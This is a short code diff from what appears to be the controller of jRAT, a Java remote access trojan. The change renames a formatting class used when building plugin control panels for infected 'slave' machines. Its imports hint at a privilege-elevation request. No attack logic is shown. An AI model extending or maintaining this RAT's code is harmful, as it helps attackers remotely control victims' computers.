@@ -38,7 +38,7 @@ import jrat.api.ui.RATControlMenuEntry;
 import se.jrat.common.script.Script;
 import se.jrat.controller.Constants;
 import se.jrat.controller.Slave;
-import se.jrat.controller.addons.RATObjectFormat;
+import se.jrat.controller.addons.ClientFormat;
 import se.jrat.controller.exceptions.ControlPanelLoadException;
 import se.jrat.controller.listeners.Performable;
 import se.jrat.controller.packets.outgoing.Packet100RequestElevation;
@@ -409,7 +409,7 @@ public class FrameControlPanel extends BaseFrame {
 			ImageIcon defaultIcon = i.get("plugins");
 			for (RATControlMenuEntry entry : entries) {
 				try {
-					BaseControlPanel panel = entry.newPanelInstance(RATObjectFormat.format(slave));
+					BaseControlPanel panel = entry.newPanelInstance(ClientFormat.format(slave));
 					panel.onLoad();
 					tabbedPane.addTab(entry.getName(), entry.getIcon() == null ? defaultIcon : entry.getIcon(), panel);
 					entry.getInstances().put(slave, panel);
